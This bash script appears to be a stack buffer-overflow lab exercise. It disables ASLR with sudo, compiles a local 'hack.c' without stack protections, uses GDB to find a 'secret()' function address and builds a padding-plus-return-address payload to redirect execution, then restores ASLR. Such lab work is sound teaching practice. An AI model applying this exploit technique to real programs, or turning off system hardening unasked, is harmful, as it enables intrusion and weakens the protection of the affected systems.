#!/bin/bash

# 禁用 ASLR
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# 编译源代码
gcc -fno-stack-protector -fno-pie -no-pie -z execstack -g -o hack hack.c

# 使用 GDB 获取 secret() 函数和缓冲区地址
SECRET_ADDR=$(gdb -batch -ex "file hack" -ex "info address secret" | grep -oP '0x[0-9a-f]+')
BUFFER_ADDR=$(gdb -batch -ex "file hack" -ex "start" -ex "print &buffer" | grep -oP '0x[0-9a-f]+')

echo "Secret address: $SECRET_ADDR"
echo "Buffer address: $BUFFER_ADDR"

# 转换地址为小端字节序
SECRET_ADDR_LE=$(echo $SECRET_ADDR | sed 's/0x//' | tac -rs .. | tr -d '\n')

# 确定填充长度
PADDING_LENGTH=64  # 调整为实际偏移值

# 创建攻击载荷
python3 -c "
addr_le = bytes.fromhex('$SECRET_ADDR_LE')
payload = b'A' * $PADDING_LENGTH + addr_le
with open('hack.txt', 'wb') as f:
    f.write(payload)
print(f'Payload written to hack.txt: {payload}')
"

# 执行攻击
./hack < hack.txt

# 恢复 ASLR
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
